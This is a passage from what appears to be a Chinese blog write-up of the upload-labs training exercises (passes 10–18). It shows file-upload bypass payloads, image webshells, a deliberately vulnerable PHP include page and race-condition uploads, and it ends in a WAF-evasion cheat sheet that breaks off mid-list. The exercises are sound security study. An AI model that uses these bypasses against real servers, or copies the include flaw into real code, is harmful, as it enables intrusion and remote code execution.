+<h3 id="后缀双写"><a href="#后缀双写" class="headerlink" title="后缀双写"></a>后缀双写</h3><p>直接构造<code>.phphpp</code><br>查看burp返回</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;../upload/10.hpp&quot; width=&quot;250px&quot; /&gt;</span><br></pre></td></tr></table></figure>
+<p>???,emmm这返回的啥.<br>啊,我构造的有点蠢,虽然是把php插在另一个php里但是最开头构成了php,所以中间的php被拆了.<br>重新构造<code>.pphphp</code>,查看返回</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;../upload/10.php&quot; width=&quot;250px&quot; /&gt;</span><br></pre></td></tr></table></figure>
+<p>恩,这样就没问题了.</p>
+<p><span id="less11"> </span></p>
+<h2 id="pass11"><a href="#pass11" class="headerlink" title="pass11"></a>pass11</h2><p>查看源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">    $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);</span><br><span class="line">    $file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);</span><br><span class="line">    if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">        $img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br></pre></td></tr></table></figure>
+<p>白名单,只允许图片后缀.但是文件上传路径是通过<code>get</code>方法取得的,猜测可以在url中传入我们构造的路径,然后将后面的代码注释掉.<br>然而我不知道怎么注释,搜索网上的writeup,可以使用<code>%00</code>截断,就把后面的字符串截断了.<br>使用<code>%00</code>截断必须满足两个条件</p>
+<ul>
+<li>php版本小于<code>5.3.4</code></li>
+<li>php的<code>magic_quotes_gpc</code>为<code>OFF</code>状态 //在php.ini中修改</li>
+</ul>
+<p>这两个条件我的服务端都满足.<br>所以我使用这个方法,在burp中自定义上传路径然后加上阶段符号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /upload-labs/Pass-11/index.php?save_path=../upload/haha/11.php%00 HTTP/1.1  //这里使用了%00截断</span><br><span class="line">Host: 192.168.96.128</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: http://192.168.96.128/upload-labs/Pass-11/index.php?save_path=../upload/</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------14066184711055</span><br><span class="line">Content-Length: 324</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------14066184711055</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;11.jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br></pre></td></tr></table></figure>
+<p>返回提示上传出错.检查了下配置和我的playload应该没有问题.<br>只能查看下源码问题在哪里了.<br>先查一下不认识的函数:</p>
+<blockquote>
+<p><code>strrpos(被查找的字符串,要查找的字符)</code>,这个函数查找某个字符在字符串中最后一次出现的位置.大小写敏感<br><code>$_FILES[][&#39;name&#39;]</code>获得上传文件的原名称.如果后面的括号里是<code>type</code>就是获得文件类型,<code>tmp_name</code>获得文件被上传后服务器存储的临时文件名,一般是默认.<code>size</code>已上传文件大小.<code>error</code>和文件上传错误相关的代码.<br><code>move_uploaded_file(string $filemane,String $destination)</code>将指定文件(必须是合法的即通过post,get上传的文件)移动到由<code>destination</code>指定的文件</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);</span><br></pre></td></tr></table></figure>
+<p>这个语句的意思就是截取上传文件的原名称的<code>.</code>后面的字符.也就是后缀.<code>$file_ext</code>这个变量保存了文件后缀</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">        $img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line"></span><br><span class="line">        if(6($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &apos;上传出错！&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else&#123;</span><br><span class="line">        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这一段意思是,如果文件后缀在我们的列表内就继续,否则提示不允许,如果继续,取得文件临时名,再通过<code>sava_path</code>构造一个<code>img_path</code>用来存放文件.<br>然后判断移动临时文件到我们构造的路径是否成功,失败就报错.<br>所以我们的移动失败了.</p>
+<p><span id="pass12"> </span></p>
+<h2 id="pass12"><a href="#pass12" class="headerlink" title="pass12"></a>pass12</h2><p>通过我不知道的某种方法,我们判断了这是截断上传,而且是通过<code>post</code>方法提交参数的截断上传.<br>由于post方法不会自动将<code>%00</code>作为截断符,我们需要直接在hex 中添加截断符<br>实际操作方法很简单<br>将burp拦截的包发送到repeater,修改raw中的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;save_path&quot;</span><br><span class="line"></span><br><span class="line">../upload/</span><br></pre></td></tr></table></figure>
+<p>在路径后添加我们需要的内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../upload/12.php</span><br></pre></td></tr></table></figure>
+<p>然后再最后再添加一个空格,作为之后修改hex值的标记<br>我们切换到hex选项卡,找到路径的那一行<br>之前我们在路径末尾添加了空格,空格的hex值为<code>20</code>,我们找到这一行的<code>20</code>将他修改为<code>00</code>就是hex中截断符.然后回车保存.<br>发包测试.失败了,同上一条一样提示上传失败.<br>暂时跳过,所有步骤和网上的好几个write up相同,应该不是操作原因.</p>
+<h2 id="pass13"><a href="#pass13" class="headerlink" title="pass13"></a>pass13</h2><p>要求为上传图片马到服务器并使用文件包含漏洞运行图片中的代码,之前学过.但是不知道怎么操作.</p>
+<h3 id="制作图片马"><a href="#制作图片马" class="headerlink" title="制作图片马"></a>制作图片马</h3><p>在win中,首先准备一个恶意代码文件假设命名为<code>m.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;  //这次我们为了方便不用一句话了,直接用代码查看服务器信息</span><br></pre></td></tr></table></figure>
+<p>然后准备一张图片假设名称为<code>pic.jpg</code><br>放在同一目录下,使用cmd进入这个目录<br>输入命令<code>copy pic.jpg/b + m.php/a picm.jpg</code></p>
+<blockquote>
+<p>命令中<code>/b</code>表明二进制文件 <code>/a</code>表明ascii文本文件<br>值得一提的是如果把两个文件调换位置(两个参数跟着)<code>copy m.php/a + pic.jpg/b picm.jpg</code>,生成的文件图片就乱码了,猜测是文本加在了图片的前面.</p>
+</blockquote>
+<p>直接将这个制作好的图片马<code>picm.jpg</code>上传到靶机.<br>上传成功了,使用burp查看,被重命名了.</p>
+<h3 id="制作文件包含入口"><a href="#制作文件包含入口" class="headerlink" title="制作文件包含入口"></a>制作文件包含入口</h3><p>虽然也可以使用<code>.htaccess</code>但是要求使用文件包含<br>由于没有发现pass13页面,本身有文件包含入口.所以我自己构造了一个包含文件包含漏洞的php页面.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file=$_GET[&apos;page&apos;];  //通过url获取参数赋值给变量</span><br><span class="line">include($file);  // 传入用户变量给`include`函数,产生漏洞.</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>手动传入服务器,访问,在url中传入我们的参数,也就是我们上传的图片码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.96.128/upload-labs/upload/include.php?page=1520190215165135.jpg</span><br></pre></td></tr></table></figure>
+<p>这样我们图片中包含的php代码就被服务器解析了.<br>我们看到页面上显示了当前php服务器信息.</p>
+<p><em>注意:当我们使用远程文件包含的时候,如果包含的能直接运行的代码文件,如.php,那么这个代码就会在文件所在机器执行,如果包含的是txt,jpg这样的含有代码的服务器不能直接解析的文件,就会包含到我们的<code>include</code>所在的代码中合并执行,也就是在使用包含函数的服务段执行</em></p>
+<h2 id="pass14"><a href="#pass14" class="headerlink" title="pass14"></a>pass14</h2><p>本pass14,通过阅读源码得知,使用<code>getimagesize()</code>函数判断文件类型,粗略搜索了这个函数会判断文件流的头,来判断是否为图片文件</p>
+<p>我们测试一下这个函数,来粗略的理解它.<br>首先我们使用十六进制编辑器,推荐使用np++</p>
+<p>首先我们构造一个php语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+<p>它的16进制值是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3C3F 7068 7020 7068 7069 6E66 6F28 293B 203F 3E</span><br></pre></td></tr></table></figure>
+<p>我们在最前面添加16进制的png头,将其构造为假的png文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8950 4E47 0D0A 1A0A 3C3F 7068 7020 7068 7069 6E66 6F28 293B 203F 3E</span><br></pre></td></tr></table></figure>
+<p>最后保存成 <code>.png</code> 后缀的文件</p>
+<blockquote>
+<p>这里注意,十六进制编辑器,我先使用的notepad++的插件.失败了,特别是无法使用64位的插件<br>然后使用ue的十六进制编辑发现无法直接将16进制的字符插入,会被自动写入字符串那边<br>最后我使用了<code>HxD</code>这个软件,成功修改了.</p>
+</blockquote>
+<p>然后上传成功.<br>我们直接使用pass14页面的文件包含漏洞,打开文件包含入口页面.页面直接展示了源码.<br>发现使用file字符可以通过get注入到include函数中.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.96.128/upload-labs/include.php?file=./upload/5320190221140730.png</span><br></pre></td></tr></table></figure>
+<p>输入payload,成功了</p>
+<p>这里我们使用pass的方法.cmd的<code>copy</code>命令拼接成的文件就含有图片文件的头信息,使用十六进制编辑器查看是含有头文件的,所以同pass13一样可以绕过,这里就不再重复.</p>
+<h2 id="pass15"><a href="#pass15" class="headerlink" title="pass15"></a>pass15</h2><p>pass15查看源码使用了<code>exif_imagetype()</code>函数.上传时发生问题,页面无响应<br>查看别人的writeup发现是没有开启服务器的<code>php_exif</code>模块.开启后上传上一个pass制作的图片码,成功了,没有继续去搜寻这个模块的作用,推测也是通过检测头的方式.</p>
+<h2 id="pass16"><a href="#pass16" class="headerlink" title="pass16"></a>pass16</h2><p>我们查看页面提示,知道了本例会比对文件后缀与文件结构是否相同,而且会重新渲染图片.这样我们即使绕过了比对,最后的图片会被重新渲染,插入的代码很可能就被修改了.<br>使用的<code>imagecreatefromgif</code>函数渲染.<br>由于需要些脚本比上传后的图片没有被修改的部分,所以我没有复现,只是了解了原理.<br>这里放出一个链接,似乎是漏洞的发现者的文章:<a href="http://link.zhihu.com/?target=https%3A//secgeek.net/bookfresh-vulnerability/" target="_blank" rel="noopener">http://link.zhihu.com/?target=https%3A//secgeek.net/bookfresh-vulnerability/</a></p>
+<p>如果有时间将会专门编写脚本重新测试这个pass</p>
+<h2 id="pass17"><a href="#pass17" class="headerlink" title="pass17"></a>pass17</h2><p>这题的本意的考察<code>条件竞争</code>,什么意思呢.我也不知道.<br>在搜索writeup的时候我发现了一个<code>win+php</code>时可以使用的方法.</p>
+<h3 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h3><p>方法可以在:<a href="https://paper.seebug.org/92/#0x05-iisphp" target="_blank" rel="noopener">https://paper.seebug.org/92/#0x05-iisphp</a> 的<code>0x05</code>标题下找到<br>建议先观看</p>
+<p>科普： 在php+window+iis环境下:</p>
+<blockquote>
+<p>双引号(“&gt;”) &lt;==&gt; 点号(“.”)’;</p>
+<p>大于符号(“&gt;”) &lt;==&gt; 问号(“?”)’;</p>
+<p>小于符号(“&lt;“) &lt;==&gt; 星号(“*”)’;</p>
+</blockquote>
+<p>其他原理不再说明直接给出操作过程.<br>首先我们先利用特殊办法生成一个php文件，然后再利用这个特性将文件覆盖..</p>
+<p>我们上传一个写有一句话的php文件使用burp抓包.我们先修改文件名称 <code>17.php:.jpg</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;17.php:.jpg&quot;</span><br></pre></td></tr></table></figure>
+<p><em>tips:冒号可以截断,冒号截断产生的文件是空白的</em><br>页面提示图片不符合要求,我们查看服务器已经生成了一个<code>17.php</code>的没有任何内容的文件</p>
+<p>然后继续修改上传名称<code>17.&lt;&lt;&lt;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;17.&lt;&lt;&lt;&quot;</span><br></pre></td></tr></table></figure>
+<p>页面提示上传不符合要求,我们查看服务器,刚才的<code>17.php</code>文件已经有代码内容了.</p>
+<h3 id="方法二-条件竞争"><a href="#方法二-条件竞争" class="headerlink" title="方法二 条件竞争"></a>方法二 条件竞争</h3><h4 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h4><p>我们先不看源码演示过程,粗略的猜想下,这个就是利用代码设计者没有考虑到多线程并发造成的某些延迟问题.<br>粗略的理解代码,这个pass先将文件上传然后比对,如果不符合条件再删除.所以要使用多线程造成程序堵塞,在这个时间访问页面.由于只能在我们不断写入的时候访问,很快就会被删除,我们要使用访问的这个文件去创建一个含有代码的文件.</p>
+<p>首先编写一个 <code>100.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&quot;info.php&quot;, &quot;w&quot;), &quot;&lt;?php phpinfo(); ?&gt;&quot;); ?&gt;  //会在当前目录写入一个`info.php`文件,内容是&quot;&lt;?php phpinfo(); ?&gt;&quot;</span><br></pre></td></tr></table></figure>
+<p>由于现在还不会编写脚本.我使用burp的 intruder功能<br>使用number类型的paylaod,变量直接设置在内容里</p>
+<p><img src="https://e1sewhere.github.io/images/tjjz.png" alt="positions"></p>
+<p><img src="https://e1sewhere.github.io/images/jjpl.png" alt="payload"></p>
+<p>然后线程设置大一点<em>线程的设置在intruder&gt;options&gt;request engin&gt;number of threads</em></p>
+<p>然后开始执行,执行期间我们访问 这个<code>100.php</code>(可以先上传一个正常的图片获得),多刷新几次,发现页面显示235,也就是上传含有235的payload的时候这个页面执行成功了,说明当前目录下已经有了一个<code>info.php</code>文件了.我们尝试访问,显示了php版本页面,成功了.</p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>查看源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;submit&apos;]))&#123;</span><br><span class="line">    $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);</span><br><span class="line">    $file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;];</span><br><span class="line">    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);</span><br><span class="line">    $upload_file = UPLOAD_PATH . &apos;/&apos; . $file_name;</span><br><span class="line"></span><br><span class="line">    if(move_uploaded_file($temp_file, $upload_file))&#123;  //不做判断直接上传了文件</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;  //判断后缀</span><br><span class="line">             $img_path = UPLOAD_PATH . &apos;/&apos;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = true;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">            unlink($upload_file);  //不符合,就删除文件</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &apos;上传出错！&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>补充函数:</p>
+<blockquote>
+<p>定义和用法<br>unlink() 函数删除文件。<br>若成功，则返回 true，失败则返回 false。<br>语法<br>unlink(filename,context)</p>
+</blockquote>
+<p>从我的简单注释发现,和之前的的描述一样.没有什么好分析的了.直接上传,判断不合法就删除.文件在多线程上传的时候就会有一个滞留时间,然后访问,执行代码.</p>
+<h2 id="pass18"><a href="#pass18" class="headerlink" title="pass18"></a>pass18</h2><p>条件竞争<br>使用重命名上传,我还没有看源码 ,之后有时间查看</p>
+<p>直接步骤<br>由于上传的文件会被重命名.利用上传重命名竞争+Apache解析漏洞<br>上传名字为<code>18.php.7Z</code>的文件,会被重命名为<code>date().7z</code><br>快速重复提交该数据包，会提示文件已经被上传，但没有被重命名<br>使用burp<br>和上面的步骤一样,只是这次可以直接上传webshell了<br>尝试了几次一直没有在upload目录下找到上传的文件,发现是作者的代码有误构造的保存路径的<code>upload</code>后面没有加<code>/</code>,这个<code>upload</code>变成了文件名的一部分.</p>
+<p><img src="https://e1sewhere.github.io/images/522.png" alt=""></p>
+<p>直到返回一个不同的页面.我们去文件路径下看.<br><img src="https://e1sewhere.github.io/images/553.png" alt=""></p>
+<p>有<code>xx.php.7z</code>这样的文件了.这里就可以使用apache解析漏洞直接访问.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://999.999.999.999/upload-labs/100.php.7z</span><br></pre></td></tr></table></figure>
+<p>就执行代码了.</p>
+<h1 id="upload-bypass"><a href="#upload-bypass" class="headerlink" title="upload bypass"></a>upload bypass</h1><h2 id="waf检测范围"><a href="#waf检测范围" class="headerlink" title="waf检测范围"></a>waf检测范围</h2><p>请求的url<br>Boundary边界<br>MIME类型<br>文件扩展名<br>文件内容</p>
+<p>测试时的准备工作：<br>什么么语言？什么容器？什么系统？都什么版本？<br>上传文件都可以上传什么格式的文件？还是允许上传任意类型？<br>上传的文件会不会被重命名或者二次渲染？</p>
+<h2 id="容器特性"><a href="#容器特性" class="headerlink" title="容器特性"></a>容器特性</h2><h3 id="apache1-x-2-x文件后缀解析漏洞"><a href="#apache1-x-2-x文件后缀解析漏洞" class="headerlink" title="apache1.x 2.x文件后缀解析漏洞"></a>apache1.x 2.x文件后缀解析漏洞</h3><p>Apache在以上版本中，解析文件名的方式是从后向前识别扩展名，直到遇见Apache可识别的扩展名为止</p>
+<h3 id="ISS6-0解析缺陷"><a href="#ISS6-0解析缺陷" class="headerlink" title="ISS6.0解析缺陷"></a>ISS6.0解析缺陷</h3><p>目录名包含 .asp 、 .asa 、 .cer 的话，则该目录下的所有文件都将按照asp解析<br>例如<code>c:\wwwroot\cer.cer\haha.jpg</code><br>这个文件就会被解析为<code>.asp</code>文件</p>
+<p>文件名中如果包含 .asp; 、 .asa; 、 .cer; 则优先使用asp解析。<br>例如： <code>asa.asa;asa.jpg</code><br>会被解析为<code>.asp</code></p>
+<h3 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h3><p>Nginx 0.5.<em><br>Nginx 0.6.</em><br>Nginx 0.7 &lt;= 0.7.65</p>
+<h4 id="Nginx-0-8-lt-0-8-37"><a href="#Nginx-0-8-lt-0-8-37" class="headerlink" title="Nginx 0.8 &lt;= 0.8.37"></a>Nginx 0.8 &lt;= 0.8.37</h4><p>以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以<br>shell.jpg%00.php进行请求。</p>
+<h4 id="Nginx-0-8-41-–-1-5-6："><a href="#Nginx-0-8-41-–-1-5-6：" class="headerlink" title="Nginx 0.8.41 – 1.5.6："></a>Nginx 0.8.41 – 1.5.6：</h4><p>以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以<br>shell.jpg%20%00.php进行请求。</p>
+<h3 id="PHP-CGI解析漏洞"><a href="#PHP-CGI解析漏洞" class="headerlink" title="PHP CGI解析漏洞"></a>PHP CGI解析漏洞</h3><p>IIS 7.0/7.5<br>Nginx &lt; 0.8.3</p>
+<p>以上的容器版本中默认php配置文件cgi.fix_pathinfo=1时，上传一个存在于白名单的扩展<br>名文件shell.jpg，在请求时以shell.jpg/shell.php请求，会将shell.jpg以php来解析</p>
+<h3 id="多个Content-Disposition"><a href="#多个Content-Disposition" class="headerlink" title="多个Content-Disposition"></a>多个Content-Disposition</h3><p>在IIS的环境下，上传文件时如果存在<code>多个Content-Disposition</code>的话，IIS会取第一个<br>Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话将会被绕过。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">content-dispositon:form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">content-dispositon:form-data; name=&quot;file&quot;; filename=&quot;shell.jpg&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="结合-htaccess"><a href="#结合-htaccess" class="headerlink" title="结合.htaccess"></a>结合.htaccess</h3><p>这个方法通常用于绕过waf黑名单的，配置该目录下所有文件都将其使用php来解析</p>
+<h2 id="系统特性"><a href="#系统特性" class="headerlink" title="系统特性"></a>系统特性</h2><h3 id="windows特殊字符"><a href="#windows特殊字符" class="headerlink" title="windows特殊字符"></a>windows特殊字符</h3><p>当我们上传一个文件的filename为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.php&#123;%80-%99&#125;</span><br></pre></td></tr></table></figure>
+<p>时(这个%80是哈希要用hex编辑)：<br>waf可能识别<code>%80-%99</code>,但是window会识别为空格,而后缀名的空格会被windows忽略.</p>
+<h3 id="exee扩展名"><a href="#exee扩展名" class="headerlink" title="exee扩展名"></a>exee扩展名</h3><p>上传.exe文件通常会被waf拦截，如果使用各种特性无用的话，那么可以把扩展名改<br>为.exee再上传。</p>
+<h3 id="NTFS-ADS特性"><a href="#NTFS-ADS特性" class="headerlink" title="NTFS ADS特性"></a>NTFS ADS特性</h3><p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求<br>正文的 filename 匹配不当的话可能会导致绕过</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">上传文件名</th>
+<th style="text-align:left">服务器表面现象</th>
+<th style="text-align:left">生成文件内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">test.php:a.jpg</td>
+<td style="text-align:left">生成test.php</td>
+<td style="text-align:left">空</td>
+</tr>
+<tr>
+<td style="text-align:left">test.php::$INDEX_ALLOCATION</td>
+<td style="text-align:left">生成test.php文件夹</td>
+<td style="text-align:left"></td>
+</tr>
+<tr>
+<td style="text-align:left">test.php::$DATA.jpg</td>
+<td style="text-align:left">生成test.php</td>
+<td style="text-align:left">原内容</td>
+</tr>
+</tbody>
+</table>
+<p>Windows在创建文件时，在文件名末尾不管加多少点(空格也是)都会自动去除，那么上传时filename<br>可以这么写 shell.php…… 也可以这么写 shell.php::$DATA…….</p>
+<h2 id="数据过长导致的绕过"><a href="#数据过长导致的绕过" class="headerlink" title="数据过长导致的绕过"></a>数据过长导致的绕过</h2><p>waf如果对<code>Content-Disposition</code>长度处理的不够好的话可能会导致绕过</p>
+<p>基于构造长文件名:<br>如果web程序会将filename除le 扩展名的那段重命名的话，那么还可以构造更多的点、符号绕过重命名.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filname=&quot;shell.............................................................................................................................................................................................................................................................asp&quot;</span><br></pre></td></tr></table></figure>
+<p>特殊的长文件名：<br>文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性测试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</span><br></pre></td></tr></table></figure>
+<h2 id="wafbypass-upload一些总结绕过"><a href="#wafbypass-upload一些总结绕过" class="headerlink" title="wafbypass_upload一些总结绕过"></a>wafbypass_upload一些总结绕过</h2><p>在这里放上个人之前总结的30个上传绕过姿势：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1. filename在content-type下面</span><br><span class="line">2. .asp&#123;80-90&#125;</span><br><span class="line">3. NTFS ADS</span><br><span class="line">4. .asp...</span><br><span class="line">5. boundary不一致</span><br><span class="line">6. iis6分号截断asp.asp;asp.jpg</span><br><span class="line">7. apache解析漏洞php.php.ddd</span><br><span class="line">8. boundary和content-disposition中间插入换行</span><br><span class="line">9. hello.php:a.jpg然后hello.&lt;&lt;&lt;</span><br><span class="line">10. filename=php.php</span><br><span class="line">11. filename=&quot;a.txt&quot;;filename=&quot;a.php&quot;</span><br><span class="line">12. name=\n&quot;file&quot;;filename=&quot;a.php&quot;</span><br><span class="line">13. content-disposition:\n</span><br><span class="line">14. .htaccess文件</span><br><span class="line">15. a.jpg.\nphp</span><br><span class="line">16. 去掉content-disposition的form-data字段</span><br><span class="line">17. php&lt;5.3 单双引号截断特性</span><br><span class="line">18. 删掉content-disposition: form-data;</span><br><span class="line">19. content-disposition\00:</span><br><span class="line">20. &#123;char&#125;+content-disposition</span><br><span class="line">21. head头的content-type: tab</span><br><span class="line">22. head头的content-type: multipart/form-DATA</span><br><span class="line">23. filename后缀改为大写</span><br><span class="line">24. head头的Content-Type: multipart/form-data;\n</span><br><span class="line">25. .asp空格</span><br><span class="line">26. .asp0x00.jpg截断</span><br><span class="line">27. 双boundary</span><br><span class="line">28. 